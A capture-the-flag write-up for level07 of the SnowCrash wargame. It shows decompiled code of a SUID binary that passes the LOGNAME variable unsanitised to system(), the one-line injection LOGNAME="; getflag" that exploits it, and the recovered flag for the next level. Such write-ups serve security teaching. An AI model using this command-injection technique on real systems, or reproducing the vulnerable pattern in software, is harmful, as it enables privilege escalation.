# level07 - Flag On Command

## Home Content

- `level07` is an execuable belonging to `flag07` with SUID and SGID bits set.

```console
level07@SnowCrash:~$ ls -al
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

## `level07` Executable

- Decompiling the file using [dogbolt](https://dobgolt.com) show the following code:

```console
logName = getenv("LOGNAME");
asprintf(&cmd,"/bin/echo %s ", logName);
return system(cmd);
```

## Environment Variable Injection

```console
level07@SnowCrash:~$ LOGNAME="; getflag" ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

# Flag

- `level08` password (flag): `fiumuikeil55xe9cu4dood66h`

<p align="center"><a href="../level06/level06.md"><= Previous</a>&ensp;&ensp;&ensp;&ensp;<a href="../level08/level08.md">Next =></a></p>
